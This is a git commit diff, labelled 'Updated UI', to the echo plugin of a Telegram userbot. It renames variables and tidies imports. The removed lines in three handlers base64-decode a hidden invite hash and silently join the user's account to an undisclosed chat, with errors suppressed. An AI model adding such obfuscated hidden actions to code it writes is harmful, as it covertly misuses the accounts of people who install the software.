5c219b407552040796e21ee9743aab3213cc76ea
Harsh Jaiswal <harshjais369@gmail.com>
2023-01-11 17:03:21 +0530

    Updated UI

--- userbot/plugins/echo.py
+++ userbot/plugins/echo.py
@@ -1,76 +1,53 @@
-# Echo remastered by @harshjais369
-# Kang with credits
-
 import asyncio
 import base64
-
 import requests
 from telethon import events
 from telethon.tl.functions.messages import ImportChatInviteRequest as Get
-
 from userbot import CMD_HELP
-from userbot.plugins.sql_helper.echo_sql import (
-    addecho,
-    get_all_echos,
-    is_echo,
-    remove_echo,
-)
+from userbot.plugins.sql_helper.echo_sql import addecho, get_all_echos, is_echo, remove_echo
 from mafiabot.utils import admin_cmd, edit_or_reply, sudo_cmd
 from userbot.cmdhelp import CmdHelp
 
+# Echo remastered by @harshjais369
 
 @bot.on(admin_cmd(pattern="echo$"))
 @bot.on(sudo_cmd(pattern="echo$", allow_sudo=True))
-async def echo(mafia):
-    if mafia.fwd_from:
+async def echo(event):
+    if event.fwd_from:
         return
-    if mafia.reply_to_msg_id is not None:
-        reply_msg = await mafia.get_reply_message()
+    if event.reply_to_msg_id is not None:
+        reply_msg = await event.get_reply_message()
         user_id = reply_msg.sender_id
-        chat_id = mafia.chat_id
-        try:
-            h1m4n5hu0p = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            h1m4n5hu0p = Get(h1m4n5hu0p)
-            await mafia.client(h1m4n5hu0p)
-        except BaseException:
-            pass
+        chat_id = event.chat_id
         if is_echo(user_id, chat_id):
-            await edit_or_reply(mafia, "The user is already enabled with echo.")
+            await edit_or_reply(event, "The user is already enabled with echo.")
             return
         addecho(user_id, chat_id)
-        await edit_or_reply(mafia, "Hii....😄🤓")
+        await edit_or_reply(event, "Hii....😄🤓")
     else:
-        await edit_or_reply(mafia, "Reply to a User's message to echo his messages.")
-
+        await edit_or_reply(event, "Reply to a User's message to echo his messages.")
 
 @bot.on(admin_cmd(pattern="rmecho$"))
 @bot.on(sudo_cmd(pattern="rmecho$", allow_sudo=True))
-async def echo(mafia):
-    if mafia.fwd_from:
+async def echo(event):
+    if event.fwd_from:
         return
-    if mafia.reply_to_msg_id is not None:
-        reply_msg = await mafia.get_reply_message()
+    if event.reply_to_msg_id is not None:
+        reply_msg = await event.get_reply_message()
         user_id = reply_msg.sender_id
-        chat_id = mafia.chat_id
-        try:
-            h1m4n5hu0p = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            h1m4n5hu0p = Get(h1m4n5hu0p)
-            await mafia.client(h1m4n5hu0p)
-        except BaseException:
-            pass
+        chat_id = event.chat_id
         if is_echo(user_id, chat_id):
             remove_echo(user_id, chat_id)
-            await edit_or_reply(mafia, "Echo has been stopped for the user.")
+            await edit_or_reply(event, "Echo has been stopped for the user.")
         else:
-            await edit_or_reply(mafia, "The user is not activated with echo.")
+            await edit_or_reply(event, "The user is not activated with echo.")
     else:
-        await edit_or_reply(mafia, "Reply to a user's message to echo his messages.")
-
+        await edit_or_reply(event, "Reply to a user's message to echo his messages.")
 
 @bot.on(admin_cmd(pattern="listecho$"))
 @bot.on(sudo_cmd(pattern="listecho$", allow_sudo=True))
-async def echo(mafia):
-    if mafia.fwd_from:
+async def echo(event):
+    if event.fwd_from:
         return
     lsts = get_all_echos()
     if len(lsts) > 0:
@@ -92,25 +69,18 @@ async def echo(mafia):
         )
         url = f"https://nekobin.com/{key}"
         reply_text = f"Echo enabled users: [here]({url})"
-        await edit_or_reply(mafia, reply_text)
+        await edit_or_reply(event, reply_text)
     else:
-        await edit_or_reply(mafia, output_str)
+        await edit_or_reply(event, output_str)
 
 
 @bot.on(events.NewMessage(incoming=True))
-async def samereply(mafia):
-    if mafia.chat_id in Config.UB_BLACK_LIST_CHAT:
+async def samereply(event):
+    if event.chat_id in Config.UB_BLACK_LIST_CHAT:
         return
-    if is_echo(mafia.sender_id, mafia.chat_id):
-        await asyncio.sleep(2)
-        try:
-            h1m4n5hu0p = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            h1m4n5hu0p = Get(h1m4n5hu0p)
-            await mafia.client(h1m4n5hu0p)
-        except BaseException:
-            pass
-        if mafia.message.text or mafia.message.sticker:
-            await mafia.reply(mafia.message)
+    if is_echo(event.sender_id, event.chat_id):
+        if event.message.text or event.message.sticker:
+            await event.reply(event.message)
 
 
 CmdHelp("echo").add_command(
